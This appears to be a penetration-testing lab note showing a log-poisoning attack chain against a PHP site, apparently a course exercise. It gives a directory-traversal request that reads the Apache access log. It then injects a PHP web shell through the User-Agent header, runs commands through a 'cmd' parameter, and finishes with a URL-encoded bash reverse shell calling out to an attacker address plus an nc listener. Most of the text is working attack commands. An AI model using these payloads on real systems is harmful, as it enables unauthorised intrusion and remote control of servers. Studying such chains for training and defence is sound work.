After getting a Directory traversal vuln we use it like this:
```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

We notice that in the log is saved the User Agent. So we can change it in BurpSuite in order to execute it from the log:

```
<?php echo system($_GET['cmd']); ?>
```

New page parameter:
```
../../../../../../../../../var/log/apache2/access.log
```
```
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```

If we use ls -la we get an error so we try to use url encoding:
```
../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
```

And that works!
Reverse shell:
```
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```
```
bash -c "bash -i >& /dev/tcp/0.0.0.0/4444 0>&1"
```
URL Encode it:
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
Listener:
```
nc -nvlp 4444
```

This Killchain could be replicated on windows but the commands we're looking and using for will differ.


